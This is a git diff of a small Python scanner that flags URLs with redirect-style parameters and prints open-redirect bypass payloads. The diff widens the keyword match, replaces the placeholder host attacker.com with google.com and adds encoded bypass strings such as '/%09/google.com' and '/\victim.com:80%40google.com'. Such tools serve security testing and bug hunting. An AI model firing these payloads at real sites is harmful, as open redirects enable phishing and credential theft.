@@ -14,7 +14,7 @@ file = open(url, "r")
 count = False
 print("[*]Running scan for possible Open Redirect vulnerable URLs...\n")
 for line in file:
-	if "rl=" in line or "redirect=" in line or "next=" in line or "r=" in line or "u=" in line:
+	if "rl=" in line or "redirect=" in line or "next=" in line or "r=" in line or "u=" in line or "next" in line or "out" in line or "view" in line or "login" in line:
 		print(Fore.GREEN + line)
 		count = True
 print(Style.RESET_ALL)
@@ -42,17 +42,25 @@ print("Finished Scanning")
 #Show examples of redirect bypass
 print("\nTry the following https://www.example.com/?redirect_to=*")
 print("""
-https://attacker.com
-target.com//attacker.com
-target.com/@attacker.com
-target.com/?image_url=attacker.com/.jpg
+https://google.com
+target.com//google.com
+target.com/@google.com
+target.com/?image_url=google.com/.jpg
 127.0.0.1
-target.com/?redirect_url=target.com.attacker.com
-https://attacker%E3%80%82com
-target.com@%E2%80%AE@attacker.com
-https:attacker.com
-http:/\/\attacker.com
-https:/\attacker.com.
+target.com/?redirect_url=target.com.google.com
+https://google%E3%80%82com
+target.com@%E2%80%AE@google.com
+https:google.com
+http:/\/\google.com
+https:/\google.com.
 .jp
+/%09/google.com
+/%5cgoogle.com
+//www.google.com/%2f%2e%2e
+//www.google.com/%2e%2e
+//google.com/
+//google.com/%2f..
+//\google.com
+/\victim.com:80%40google.com
 """)
 sys.exit()
